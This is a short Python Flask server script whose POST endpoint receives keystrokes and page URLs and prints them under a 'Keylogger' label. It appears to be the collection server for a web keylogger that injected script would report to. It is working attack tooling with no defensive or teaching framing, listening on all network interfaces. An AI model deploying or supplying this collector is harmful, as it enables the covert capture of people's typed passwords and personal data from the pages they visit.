from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    if data:
        key = data.get('key')
        url = data.get('url')
        print(f"[+] Keylogger: '{key}' a {url}")
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
